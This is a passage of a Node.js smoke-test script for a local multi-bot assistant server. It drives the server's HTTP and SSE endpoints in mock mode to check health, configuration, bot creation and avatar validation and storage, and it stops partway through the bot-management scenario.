#!/usr/bin/env node
/**
 * smoke.mjs - boots the real server in mock mode on a free port, drives a full
 * scenario over HTTP + SSE, and prints PASS/FAIL per assertion.
 *
 * It never touches the project's own data/: config/, skills/, public/ and
 * workspace/ are copied into a temp directory and ASSIST_HOME points there, so a
 * green run leaves the repo exactly as it was.
 *
 * Exit code 0 = every assertion passed. Non-zero = something is broken.
 */

import { spawn } from 'node:child_process';
import fsp from 'node:fs/promises';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import zlib from 'node:zlib';
import { fileURLToPath } from 'node:url';

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

// ---------------------------------------------------------------------------
// tiny assertion harness
// ---------------------------------------------------------------------------

const results = [];

function record(ok, name, detail = '') {
  results.push({ ok, name, detail });
  const line = ok ? `PASS  ${name}` : `FAIL  ${name}${detail ? `  <- ${detail}` : ''}`;
  console.log(line);
  return ok;
}

function check(name, condition, detail = '') {
  return record(Boolean(condition), name, condition ? '' : detail);
}

function checkEqual(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  return record(ok, name, ok ? '' : `expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
}

function skip(name, why) {
  console.log(`SKIP  ${name}  (${why})`);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** Run an async fn and return the error code it throws, or null. */
async function errorCode(fn) {
  try {
    await fn();
    return null;
  } catch (err) {
    return err.code || err.message;
  }
}

/**
 * Run one scenario. A throw becomes a single FAIL instead of taking down the
 * whole run, so a smoke run always reports the full picture.
 */
async function stage(name, fn) {
  try {
    await fn();
  } catch (err) {
    record(false, `stage "${name}" completed without throwing`, err?.message || String(err));
  }
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------

let child = null;
let home = null;
let base = '';

async function main() {
  home = await fsp.mkdtemp(path.join(os.tmpdir(), 'assist-smoke-'));
  await seedHome(home);
  pointEnvAt(home);

  // Modules that read ASSIST_HOME at import time must be imported only after the
  // environment is pointed at the temp home.
  const approvals = await import('../src/approvals.mjs');
  const routines = await import('../src/routines.mjs');
  const skillsMod = await import('../src/skills.mjs');
  const memoryMod = await import('../src/memory.mjs');
  const toolsMod = await import('../src/tools.mjs');
  const authMod = await import('../src/auth.mjs');
  const settingsMod = await import('../src/settings.mjs');
  const modelMod = await import('../src/model.mjs');
  const botsMod = await import('../src/bots.mjs');
  const groupsMod = await import('../src/groups.mjs');
  const storeMod = await import('../src/store.mjs');
  const browserMod = await import('../src/browser.mjs');

  await bootServer();

  try {
    await stage('basics', scenarioBasics);
    await stage('settings', () => scenarioSettings({ settingsMod }));
    await stage('auth gate', () => scenarioAuth({ auth: authMod }));
    await stage('pairing', scenarioPairing);
    await stage('bots', scenarioBots);
    await stage('bot avatars', scenarioBotAvatars);
    await stage('chief turn', scenarioChiefTurn);
    await stage('bot previews', scenarioBotPreviews);
    await stage('bot management', () => scenarioBotManagement({ approvals, botsMod, groupsMod, toolsMod }));
    await stage('group chats', () => scenarioGroups({ botsMod, groupsMod, toolsMod }));
    await stage('mock streaming', scenarioMockStreaming);
    await stage('handoff', scenarioHandoff);
    await stage('approval approve', scenarioApprovalApprove);
    await stage('approval deny', scenarioApprovalDeny);
    await stage('routine needs approval', scenarioRoutineNeedsApproval);
    await stage('routine success', scenarioRoutineSuccess);
    await stage('skill save', scenarioSkillSaveViaBot);
    await stage('error shapes', scenarioErrors);
    await stage('attachments and voice', scenarioAttachmentsAndVoice);
    await stage('browser automation', () => scenarioBrowser({ toolsMod, browserMod, home }));
    await stage('unit checks', () =>
      unitChecks({ approvals, routines, skillsMod, memoryMod, toolsMod, botsMod, storeMod, home }),
    );
    await stage('machines and policy', () => scenarioMachinesAndPolicy({ approvals, toolsMod }));
    await stage('streaming parser', () => scenarioStreamingParser({ modelMod }));
    await stage('crash recovery', scenarioCrashRecovery);
  } finally {
    await stopChild();
    // Leave the temp dir behind only when something failed, so it can be inspected.
    const failed = results.filter((r) => !r.ok).length;
    if (!failed) await fsp.rm(home, { recursive: true, force: true }).catch(() => {});
    else console.log(`\n(temp home kept for inspection: ${home})`);
  }

  const failed = results.filter((r) => !r.ok);
  console.log('');
  console.log(`RESULT  ${results.length - failed.length}/${results.length} assertions passed`);
  if (failed.length) {
    for (const f of failed) console.log(`  - ${f.name}${f.detail ? `  <- ${f.detail}` : ''}`);
    process.exitCode = 1;
  } else {
    console.log('RESULT  smoke test passed');
    process.exitCode = 0;
  }
}

// ---------------------------------------------------------------------------
// environment
// ---------------------------------------------------------------------------

async function seedHome(target) {
  const dirs = ['config', 'skills', 'public', 'workspace'];
  for (const dir of dirs) {
    const src = path.join(REPO, dir);
    try {
      await fsp.cp(src, path.join(target, dir), { recursive: true });
    } catch (err) {
      if (err.code !== 'ENOENT') throw err;
    }
  }
  // The product ships one bot. The roster, group and grant scenarios need a
  // few specialists, so they come from test fixtures, never from config/.
  await fsp.cp(path.join(REPO, 'scripts', 'fixtures', 'bots'), path.join(target, 'config', 'bots'), { recursive: true });
  // data/ is created by the server itself; do not copy the real one.
}

function pointEnvAt(target) {
  process.env.ASSIST_HOME = target;
  process.env.ASSIST_DATA_DIR = path.join(target, 'data');
  process.env.ASSIST_WORKSPACE_DIR = path.join(target, 'workspace');
  process.env.ASSIST_MODEL_PROVIDER = 'mock';
  delete process.env.ASSIST_API_KEY;
  // The browser tools auto-detect Chrome/Edge, so a *missing* binary is simulated
  // by pointing CHROME_PATH at a file that does not exist: that keeps the
  // not_configured assertion deterministic on any machine. The browser stage
  // deletes it again to exercise real auto-detection.
  process.env.CHROME_PATH = path.join(target, 'no-such-browser.exe');
  delete process.env.ALLOW_PRIVATE;
  process.env.PORT = '0';
}

async function startServerChild(target) {
  const env = { ...process.env, ASSIST_HOME: target, PORT: '0' };
  const proc = spawn(process.execPath, [path.join(REPO, 'src', 'server.mjs')], {
    env,
    stdio: ['ignore', 'pipe', 'pipe'],
    windowsHide: true,
  });

  const ready = await new Promise((resolve, reject) => {
    let buffer = '';
    let stderr = '';
    const timer = setTimeout(() => reject(new Error(`server did not announce readiness in 20s\n${stderr}`)), 20000);

    proc.stdout.on('data', (chunk) => {
      buffer += chunk.toString('utf8');
      for (const line of buffer.split('\n')) {
        const trimmed = line.trim();
        if (!trimmed.startsWith('{')) continue;
        try {
          const parsed = JSON.parse(trimmed);
          if (parsed.event === 'ready') {
            clearTimeout(timer);
            resolve(parsed);
          }
        } catch {
          /* partial line, keep buffering */
        }
      }
      // Keep only the tail so the buffer cannot grow forever.
      if (buffer.length > 20000) buffer = buffer.slice(-4000);
    });

    proc.stderr.on('data', (chunk) => {
      stderr += chunk.toString('utf8');
      if (stderr.length > 20000) stderr = stderr.slice(-8000);
    });

    proc.on('exit', (code) => {
      clearTimeout(timer);
      reject(new Error(`server exited early with code ${code}\n${stderr}`));
    });
  });

  return { child: proc, url: ready.url, provider: ready.provider, ready };
}

/** Boot (or reboot) the real server on the temp home and point the helpers at it. */
async function bootServer() {
  const started = await startServerChild(home);
  child = started.child;
  base = started.url;
  return started;
}

/** Power-cut simulation: no SIGTERM, no graceful cleanup, no chance to write. */
async function killChildHard() {
  const proc = child;
  child = null;
  if (!proc || proc.exitCode !== null) return;
  const exited = new Promise((resolve) => proc.once('exit', resolve));
  proc.kill('SIGKILL');
  await Promise.race([exited, sleep(5000)]);
}

async function waitUntil(predicate, timeoutMs = 5000, label = 'condition') {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    if (await predicate()) return true;
    await sleep(50);
  }
  throw new Error(`timed out waiting for ${label}`);
}

async function stopChild() {
  if (!child) return;
  const proc = child;
  child = null;
  if (proc.exitCode !== null) return;
  const exited = new Promise((resolve) => proc.once('exit', resolve));
  proc.kill('SIGTERM');
  const timedOut = await Promise.race([
    exited.then(() => false),
    sleep(4000).then(() => true),
  ]);
  if (timedOut) {
    proc.kill('SIGKILL');
    await Promise.race([exited, sleep(2000)]);
  }
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

async function api(pathname, { method = 'GET', body, headers = {} } = {}) {
  const res = await fetch(`${base}${pathname}`, {
    method,
    headers: { ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const text = await res.text();
  let json = null;
  try {
    json = JSON.parse(text);
  } catch {
    /* not json */
  }
  return { status: res.status, json, text, headers: res.headers };
}

/** Same as api(), but for endpoints whose body/response is raw bytes. */
async function apiRaw(pathname, { method = 'GET', body, contentType } = {}) {
  const res = await fetch(`${base}${pathname}`, {
    method,
    headers: contentType ? { 'content-type': contentType } : undefined,
    body,
  });
  const buffer = Buffer.from(await res.arrayBuffer());
  let json = null;
  try {
    json = JSON.parse(buffer.toString('utf8'));
  } catch {
    /* an image, which is the point */
  }
  return { status: res.status, buffer, json, headers: res.headers };
}

// --- generated images (no dependencies: PNG is IHDR/IDAT/IEND + zlib) --------

function crc32(buffer) {
  let crc = 0xffffffff;
  for (const byte of buffer) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) crc = (crc >>> 1) ^ (0xedb88320 & -(crc & 1));
  }
  return (crc ^ 0xffffffff) >>> 0;
}

/** A real, decodable truecolour PNG. */
function makePng(width = 4, height = 4, rgb = [0x8b, 0x5c, 0xff]) {
  const stride = width * 3 + 1;
  const raw = Buffer.alloc(stride * height);
  for (let y = 0; y < height; y += 1) {
    raw[y * stride] = 0; // filter type 0
    for (let x = 0; x < width; x += 1) {
      const at = y * stride + 1 + x * 3;
      raw[at] = rgb[0];
      raw[at + 1] = rgb[1];
      raw[at + 2] = rgb[2];
    }
  }
  const chunk = (type, data) => {
    const length = Buffer.alloc(4);
    length.writeUInt32BE(data.length, 0);
    const body = Buffer.concat([Buffer.from(type, 'ascii'), data]);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(body), 0);
    return Buffer.concat([length, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', zlib.deflateSync(raw)),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

/** A minimal RIFF/WEBP envelope - enough for the server's content sniffing. */
function makeWebp() {
  const buffer = Buffer.alloc(24);
  buffer.write('RIFF', 0, 'ascii');
  buffer.writeUInt32LE(16, 4);
  buffer.write('WEBP', 8, 'ascii');
  buffer.write('VP8L', 12, 'ascii');
  buffer.writeUInt32LE(8, 16);
  return buffer;
}

/** The avatar files for one bot that actually exist on disk. */
async function avatarFilesFor(botId) {
  const names = await fsp.readdir(path.join(home, 'data', 'avatars')).catch(() => []);
  return names.filter((name) => name.slice(0, name.lastIndexOf('.')) === botId).sort();
}


/** Open the SSE stream and collect every event that arrives. */
async function openStream(botId = '', { groupId = '' } = {}) {
  const controller = new AbortController();
  const filters = [];
  if (botId) filters.push(`botId=${encodeURIComponent(botId)}`);
  if (groupId) filters.push(`groupId=${encodeURIComponent(groupId)}`);
  const res = await fetch(`${base}/api/stream${filters.length ? `?${filters.join('&')}` : ''}`, {
    signal: controller.signal,
    headers: { accept: 'text/event-stream' },
  });
  const events = [];
  let done = false;

  (async () => {
    const decoder = new TextDecoder();
    let buffer = '';
    try {
      for await (const chunk of res.body) {
        buffer += decoder.decode(chunk, { stream: true });
        let split;
        while ((split = buffer.indexOf('\n\n')) !== -1) {
          const frame = buffer.slice(0, split);
          buffer = buffer.slice(split + 2);
          for (const line of frame.split('\n')) {
            if (!line.startsWith('data:')) continue;
            try {
              events.push(JSON.parse(line.slice(5).trim()));
            } catch {
              /* heartbeat/comment */
            }
          }
        }
      }
    } catch {
      /* aborted on purpose */
    } finally {
      done = true;
    }
  })();

  return {
    events,
    get closed() {
      return done;
    },
    waitFor(predicate, timeoutMs = 10000, label = 'event') {
      return new Promise((resolve, reject) => {
        const deadline = Date.now() + timeoutMs;
        const tick = () => {
          const found = events.find(predicate);
          if (found) return resolve(found);
          if (Date.now() > deadline) {
            const seen = events.map((e) => e.type).join(', ');
            return reject(new Error(`timed out waiting for ${label}; saw [${seen}]`));
          }
          setTimeout(tick, 25);
        };
        tick();
      });
    },
    close() {
      controller.abort();
    },
  };
}

/** POST a message and wait for that turn to end. Returns {turnId, events}. */
async function runTurn(botId, text, stream, timeoutMs = 15000) {
  const res = await api(`/api/bots/${botId}/message`, { method: 'POST', body: { text } });
  if (res.status !== 200) throw new Error(`message POST failed (${res.status}): ${res.text}`);
  const turnId = res.json.turnId;
  const end = await stream.waitFor((e) => e.type === 'turn.end' && e.turnId === turnId, timeoutMs, `turn.end for ${turnId}`);
  return { turnId, status: end.status, summary: end.summary, events: stream.events.filter((e) => e.turnId === turnId) };
}

// ---------------------------------------------------------------------------
// scenarios
// ---------------------------------------------------------------------------

async function scenarioBasics() {
  const health = await api('/api/health');
  check('GET /api/health returns 200', health.status === 200, `status ${health.status}`);
  check('health says ok and provider is mock', health.json?.ok === true && health.json?.model?.provider === 'mock', JSON.stringify(health.json?.model));
  check('health reports 3 starter bots', health.json?.bots === 3, `got ${health.json?.bots}`);

  const config = await api('/api/config');
  check('GET /api/config exposes policy without secrets', config.status === 200 && Boolean(config.json?.policy?.denyPatterns?.length));
  check('config contains no api key material', !config.text.includes('sk-') && !config.text.includes('apiKey'));

  const index = await fetch(`${base}/`);
  const html = await index.text();
  check('GET / serves the UI', index.status === 200 && html.includes('<!DOCTYPE html'), `status ${index.status}`);
  check('UI is a single self-contained file (no CDN)', !/https?:\/\/cdn\.|unpkg|jsdelivr/i.test(html));

  const pkg = JSON.parse(await fsp.readFile(path.join(REPO, 'package.json'), 'utf8'));
  const declared = Object.keys(pkg.dependencies || {});
  const devDeclared = Object.keys(pkg.devDependencies || {});
  // Desk used to be dependency-free. v3's one-click remote provisioning needs
  // ssh2 at runtime, so this now guards the dependency *boundary* instead:
  // no casual dependencies, and no devDependencies in the shipped build.
  check(
    'package.json declares only the approved runtime dependency',
    declared.length === 1 && declared[0] === 'ssh2' && devDeclared.length === 0,
    `deps=${declared.join(',')} devDeps=${devDeclared.join(',')}`,
  );
  check('package.json is an ES module package', pkg.type === 'module');

  // Walk the runtime dependency closure (optional native deps excluded) and make
  // sure electron-builder ships every one of them next to the server. asn1's
  // safer-buffer was missed once and broke ssh2 in packaged builds; this keeps
  // that class of mistake from coming back.
  const runtimeTree = new Set();
  const walkDeps = async (name) => {
    if (runtimeTree.has(name)) return;
    runtimeTree.add(name);
    let meta;
    try {
      meta = JSON.parse(await fsp.readFile(path.join(REPO, 'node_modules', name, 'package.json'), 'utf8'));
    } catch { return; }
    for (const child of Object.keys(meta.dependencies || {})) await walkDeps(child);
  };
  for (const name of declared) await walkDeps(name);
  const builderYml = await fsp.readFile(path.join(REPO, 'desktop', 'electron-builder.yml'), 'utf8');
  const notShipped = [...runtimeTree].filter((name) => !builderYml.includes(`from: ../node_modules/${name}`));
  check(
    'desktop package ships the full runtime dependency tree',
    notShipped.length === 0,
    `missing from extraResources: ${notShipped.join(', ')}`,
  );
}

async function scenarioBots() {
  const list = await api('/api/bots');
  check('GET /api/bots returns 3 bots', list.status === 200 && list.json.length === 3, `got ${list.json?.length}`);
  const chief = list.json.find((b) => b.id === 'chief');
  const researcher = list.json.find((b) => b.id === 'researcher');
  const ops = list.json.find((b) => b.id === 'ops');
  check('chief is the primary bot', chief?.primary === true);
  check('researcher is granted web tools but not shell', researcher?.tools.includes('http_fetch') && !researcher.tools.includes('shell'));
  check('ops is granted shell and has strict approvals', ops?.tools.includes('shell') && ops.policy.autoApproveMedium === false);
  check('researcher auto-approves medium risk', researcher?.policy.autoApproveMedium === true);
  check('bots have distinct roles', new Set(list.json.map((b) => b.role)).size === 3);

  const created = await api('/api/bots', { method: 'POST', body: { name: 'Scribe', role: 'writes things down' } });
  check('POST /api/bots creates a bot', created.status === 200 && created.json.bot.id === 'scribe', created.text);
  const afterCreate = await api('/api/bots');
  check('roster grew to 4', afterCreate.json.length === 4);

  const patched = await api('/api/bots/scribe', { method: 'PATCH', body: { role: 'keeps the minutes' } });
  check('PATCH /api/bots/:id updates a field', patched.status === 200 && patched.json.bot.role === 'keeps the minutes');

  const dup = await api('/api/bots', { method: 'POST', body: { name: 'Scribe' } });
  check('duplicate bot id is rejected with 409', dup.status === 409 && dup.json?.error?.code === 'BOT_EXISTS', dup.text);

  const deleted = await api('/api/bots/scribe', { method: 'DELETE' });
  check('DELETE /api/bots/:id removes it', deleted.status === 200 && deleted.json.deleted === true);
  const afterDelete = await api('/api/bots');
  check('roster is back to 3', afterDelete.json.length === 3);
}

const AVATAR_SHAPES = [
  'squircle',
  'circle',
  'blob',
  'star',
  'flower',
  'hex',
  'octagon',
  'diamond',
  'arch',
  'leaf',
  'gem',
  'wave',
  'ring',
  'drop',
  'chip',
];

async function scenarioBotAvatars() {
  // --- every bot exposes the full avatar contract --------------------------
  const list = await api('/api/bots');
  const contractOk = list.json.every(
    (bot) =>
      AVATAR_SHAPES.includes(bot.avatar?.shape) &&
      /^#[0-9a-f]{6}$/.test(bot.avatar?.color || '') &&
      typeof bot.avatar?.hasImage === 'boolean' &&
      (bot.avatar?.imageUrl === null || bot.avatar?.imageUrl === `/api/bots/${bot.id}/avatar`) &&
      typeof bot.avatarColor === 'string',
  );
  check('every bot exposes {shape,color,hasImage,imageUrl} plus avatarColor', contractOk, JSON.stringify(list.json.map((b) => b.avatar)));

  // --- legacy bots: no avatar in the file, a default grown from avatarColor ---
  // The shipped roster may already carry avatars, so this writes a genuinely
  // legacy bot file - the shape every pre-avatar install has - and reads it back
  // through the API.
  const legacyFile = path.join(home, 'config', 'bots', 'legacybot.json');
  await fsp.writeFile(
    legacyFile,
    JSON.stringify(
      {
        id: 'legacybot',
        name: 'Legacy',
        avatarColor: '#123456',
        role: 'from an older install',
        persona: '',
        primary: false,
        tools: [],
        skills: [],
        policy: { autoApproveMedium: false, denyPatterns: [], maxSteps: 12, maxTurnMs: 300000 },
        createdAt: '2025-01-01T00:00:00.000Z',
      },
      null,
      2,
    ),
  );
  const legacyList = await api('/api/bots');
  const legacy = legacyList.json.find((b) => b.id === 'legacybot');
  checkEqual('a legacy bot gets the default squircle avatar', legacy?.avatar, {
    shape: 'squircle',
    color: '#123456',
    hasImage: false,
    imageUrl: null,
  });
  check('a legacy bot still exposes avatarColor unchanged', legacy?.avatarColor === '#123456', legacy?.avatarColor);
  const legacyAfter = JSON.parse(await fsp.readFile(legacyFile, 'utf8'));
  check('reading a legacy bot does not migrate its file', legacyAfter.avatar === undefined, JSON.stringify(legacyAfter.avatar));

  // --- creating a bot with an avatar ---------------------------------------
  const created = await api('/api/bots', {
    method: 'POST',
    body: { name: 'Palette', role: 'keeps the colours honest', avatar: { shape: 'star', color: '#Ff00Aa' } },
  });
  check('POST /api/bots accepts an avatar', created.status === 200 && created.json?.bot?.id === 'palette', created.text);
  checkEqual('the avatar is returned with a lowercased colour', created.json?.bot?.avatar, {
    shape: 'star',
    color: '#ff00aa',
    hasImage: false,
    imageUrl: null,
  });
  check(
    'the avatar colour is mirrored into avatarColor for older clients',
    created.json?.bot?.avatarColor === '#ff00aa',
    created.json?.bot?.avatarColor,
  );
  const paletteFile = JSON.parse(await fsp.readFile(path.join(home, 'config', 'bots', 'palette.json'), 'utf8'));
  checkEqual('the bot file stores only shape and colour', paletteFile.avatar, { shape: 'star', color: '#ff00aa' });

  // --- every shape the UI can draw ----------------------------------------
  for (const shape of AVATAR_SHAPES) {
    const patched = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { shape } } });
    check(
      `avatar shape "${shape}" is accepted`,
      patched.status === 200 && patched.json?.bot?.avatar?.shape === shape,
      patched.text.slice(0, 160),
    );
  }

  // --- garbage in -----------------------------------------------------------
  const badShapes = ['potato', 'round', '', 'Star!', 'squarcle', 42];
  const shapeFailures = [];
  for (const shape of badShapes) {
    const res = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { shape } } });
    if (res.status !== 400 || res.json?.error?.code !== 'AVATAR_BAD_SHAPE') {
      shapeFailures.push(`${JSON.stringify(shape)} -> ${res.status} ${res.json?.error?.code}`);
    }
  }
  check('unknown avatar shapes are rejected with 400 AVATAR_BAD_SHAPE', shapeFailures.length === 0, shapeFailures.join('; '));

  const badColors = ['red', '#fff', '#12345', '#12345g', 'rgb(0,0,0)', 'abcdef', '', null];
  const colorFailures = [];
  for (const color of badColors) {
    const res = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color } } });
    if (res.status !== 400 || res.json?.error?.code !== 'AVATAR_BAD_COLOR') {
      colorFailures.push(`${JSON.stringify(color)} -> ${res.status} ${res.json?.error?.code}`);
    }
  }
  check('bad avatar colours are rejected with 400 AVATAR_BAD_COLOR', colorFailures.length === 0, colorFailures.join('; '));

  const upperColor = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color: '#ABCDEF' } } });
  check(
    'an uppercase colour is accepted and stored lowercase',
    upperColor.status === 200 && upperColor.json?.bot?.avatar?.color === '#abcdef',
    upperColor.text.slice(0, 160),
  );

  const notAnObject = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: 'blue' } });
  check(
    'avatar must be an object',
    notAnObject.status === 400 && notAnObject.json?.error?.code === 'AVATAR_INVALID',
    notAnObject.text.slice(0, 160),
  );

  const badCreate = await api('/api/bots', { method: 'POST', body: { name: 'Ugly', avatar: { shape: 'triangle' } } });
  check(
    'POST /api/bots validates the shape too',
    badCreate.status === 400 && badCreate.json?.error?.code === 'AVATAR_BAD_SHAPE',
    badCreate.text.slice(0, 160),
  );

  // --- PATCH avatar only touches the avatar --------------------------------
  const before = (await api('/api/bots/palette')).json.bot;
  const patched = await api('/api/bots/palette', { method: 'PATCH', body: { avatar: { color: '#112233' } } });
  check('PATCH avatar.color keeps the shape', patched.json?.bot?.avatar?.shape === 'chip', patched.json?.bot?.avatar?.shape);
  checkEqual('PATCH avatar.color applies the colour', patched.json?.bot?.avatar?.color, '#112233');
  check(
    'PATCH avatar preserves the rest of the bot',
    patched.json?.bot?.name === before.name &&
      patched.json?.bot?.role === before.role &&
      patched.json?.bot?.persona === before.persona &&
      patched.json?.bot?.primary === before.primary &&
      patched.json?.bot?.createdAt === before.createdAt &&
      JSON.stringify(patched.json?.bot?.tools) === JSON.stringify(before.tools) &&
      JSON.stringify(patched.json?.bot?.skills) === JSON.stringify(before.skills) &&
      JSON.stringify(patched.json?.bot?.policy) === JSON.stringify(before.policy),
    JSON.stringify(patched.json?.bot).slice(0, 240),
  );

  // --- upload -> fetch -> replace -> delete --------------------------------
  const png = makePng();
  const upload = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  check('POST /api/bots/:id/avatar stores the bytes', upload.status === 200 && upload.json?.ok === true, upload.buffer.toString('utf8').slice(0, 160));
  checkEqual('upload answers with the image URL', upload.json?.imageUrl, '/api/bots/palette/avatar');

  const withImage = await api('/api/bots/palette');
  check(
    'the bot reports hasImage and imageUrl',
    withImage.json?.bot?.avatar?.hasImage === true && withImage.json?.bot?.avatar?.imageUrl === '/api/bots/palette/avatar',
    JSON.stringify(withImage.json?.bot?.avatar),
  );

  const fetched = await apiRaw('/api/bots/palette/avatar');
  check('GET avatar returns the exact bytes', fetched.status === 200 && Buffer.compare(fetched.buffer, png) === 0, `status ${fetched.status}`);
  checkEqual('GET avatar serves image/png', fetched.headers.get('content-type'), 'image/png');
  checkEqual('an unversioned avatar URL is no-cache', fetched.headers.get('cache-control'), 'no-cache');
  check('content-length matches the image size', Number(fetched.headers.get('content-length')) === png.length);

  const versioned = await apiRaw('/api/bots/palette/avatar?v=1700000000000');
  checkEqual(
    'a versioned avatar URL is immutable for a year',
    versioned.headers.get('cache-control'),
    'private, max-age=31536000, immutable',
  );
  check('a versioned avatar URL returns the same bytes', Buffer.compare(versioned.buffer, png) === 0);

  const stored = await avatarFilesFor('palette');
  checkEqual('the image lives at data/avatars/<botId>.png', stored, ['palette.png']);

  const swapped = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: makeWebp(), contentType: 'image/webp' });
  check('a second upload in another format is accepted', swapped.status === 200, swapped.buffer.toString('utf8').slice(0, 160));
  checkEqual('one image per bot: the old format is removed', await avatarFilesFor('palette'), ['palette.webp']);
  const webpFetch = await apiRaw('/api/bots/palette/avatar');
  checkEqual('the served content-type follows the stored format', webpFetch.headers.get('content-type'), 'image/webp');

  const removed = await api('/api/bots/palette/avatar', { method: 'DELETE' });
  check('DELETE /api/bots/:id/avatar answers ok', removed.status === 200 && removed.json?.ok === true, removed.text);
  const gone = await apiRaw('/api/bots/palette/avatar');
  check(
    'GET avatar after DELETE is a JSON 404',
    gone.status === 404 && gone.json?.error?.code === 'AVATAR_NOT_FOUND',
    gone.buffer.toString('utf8').slice(0, 160),
  );
  const noImage = await api('/api/bots/palette');
  check(
    'DELETE clears hasImage but keeps the avatar look',
    noImage.json?.bot?.avatar?.hasImage === false &&
      noImage.json?.bot?.avatar?.imageUrl === null &&
      noImage.json?.bot?.avatar?.shape === 'chip' &&
      noImage.json?.bot?.avatar?.color === '#112233',
    JSON.stringify(noImage.json?.bot?.avatar),
  );
  const removedAgain = await api('/api/bots/palette/avatar', { method: 'DELETE' });
  check('DELETE avatar is idempotent', removedAgain.status === 200 && removedAgain.json?.ok === true);

  // --- refusals -----------------------------------------------------------
  const wrongType = await apiRaw('/api/bots/palette/avatar', { method: 'POST', body: png, contentType: 'text/plain' });
  check(
    'a non-image content-type is refused',
    wrongType.status === 400 && wrongType.json?.error?.code === 'AVATAR_BAD_TYPE',
    wrongType.buffer.toString('utf8').slice(0, 160),
  );

  const fakePng = await apiRaw('/api/bots/palette/avatar', {
    method: 'POST',
    body: Buffer.from('<html>definitely not a png</html>'),
    contentType: 'image/png',
  });
  check(
    'bytes that are not an image are refused even when labelled png',
    fakePng.status === 400 && fakePng.json?.error?.code === 'AVATAR_BAD_TYPE',
    fakePng.buffer.toString('utf8').slice(0, 160),
  );

  const tooBig = await apiRaw('/api/bots/palette/avatar', {
    method: 'POST',
    body: Buffer.alloc(2 * 1024 * 1024 + 16),
    contentType: 'image/png',
  });
  check(
    'an image over 2 MB is refused with AVATAR_TOO_LARGE',
    tooBig.status === 400 && tooBig.json?.error?.code === 'AVATAR_TOO_LARGE',
    tooBig.buffer.toString('utf8').slice(0, 160),
  );
  checkEqual('a refused upload leaves no image behind', await avatarFilesFor('palette'), []);

  const unknownBot = await apiRaw('/api/bots/nobody/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  check(
    'uploading an avatar for an unknown bot is a 404',
    unknownBot.status === 404 && unknownBot.json?.error?.code === 'BOT_NOT_FOUND',
    unknownBot.buffer.toString('utf8').slice(0, 160),
  );

  // --- deleting a bot takes its image with it ------------------------------
  await api('/api/bots', { method: 'POST', body: { name: 'Temporary Avatar' } });
  await apiRaw('/api/bots/temporary-avatar/avatar', { method: 'POST', body: png, contentType: 'image/png' });
  const temporaryImage = await avatarFilesFor('temporary-avatar');
  await api('/api/bots/temporary-avatar', { method: 'DELETE' });
  check(
    'deleting a bot deletes its avatar image',
    temporaryImage.length === 1 && (await avatarFilesFor('temporary-avatar')).length === 0,
    temporaryImage.join(','),
  );

  // --- no transcript yet, so no preview ------------------------------------
  const empty = await api('/api/bots');
  check(
    'bots that have never spoken have preview:null',
    empty.json.every((bot) => bot.preview === null),
    JSON.stringify(empty.json.map((bot) => [bot.id, bot.preview])),
  );

  const cleanup = await api('/api/bots/palette', { method: 'DELETE' });
  const legacyCleanup = await api('/api/bots/legacybot', { method: 'DELETE' });
  check(
    'the avatar test bots are cleaned up',
    cleanup.status === 200 && cleanup.json.deleted === true && legacyCleanup.status === 200,
    cleanup.text,
  );
}

async function scenarioBotPreviews() {
  const list = await api('/api/bots');
  const chief = list.json.find((b) => b.id === 'chief');
  check('GET /api/bots includes a preview for a bot that has spoken', Boolean(chief?.preview) && typeof chief?.preview?.text === 'string');
  check('preview.kind is the message role', chief?.preview?.kind === 'assistant', chief?.preview?.kind);
  check('preview.ts is an ISO date', !Number.isNaN(Date.parse(chief?.preview?.ts || '')), chief?.preview?.ts);

  const messages = await api('/api/bots/chief/messages');
  const lastAssistant = [...messages.json].reverse().find((m) => m.role === 'assistant' && m.text);
  const expected = Array.from(String(lastAssistant?.text || '').replace(/\s+/g, ' ').trim())
    .slice(0, 120)
    .join('');
  checkEqual('preview is the last assistant message', chief?.preview?.text, expected);
  check(
    'preview is neither the user prompt nor a tool chip',
    chief?.preview?.text !== 'List the files in the workspace and write a note' &&
      !String(chief?.preview?.text).includes('fs_list') &&
      !String(chief?.preview?.text).includes('fs_write'),
    chief?.preview?.text,
  );
  check(
    'bots without a transcript keep preview:null',
    list.json.find((b) => b.id === 'researcher')?.preview === null && list.json.find((b) => b.id === 'ops')?.preview === null,
  );
}

// ---------------------------------------------------------------------------
// bot management tools (create / update / delete, with honest risk levels)
// ---------------------------------------------------------------------------

async function scenarioBotManagement({ approvals, botsMod, groupsMod, toolsMod }) {
  const workspaceDir = path.join(home, 'workspace');
  const registry = toolsMod.createRegistry({
    workspaceDir,
    config: {},
    getRuntime: () => {
      throw new Error('bot-management tools never start turns');
    },
    getRoutines: () => {
      throw new Error('bot-management tools never run routines');
    },
  });

  /** The context the agent would hand a tool during a chief turn. */
  const toolCtx = async (botId = 'chief') => ({
    bot: await botsMod.getBot(botId),
    config: await botsMod.loadAssistantConfig(),
    workspaceDir,
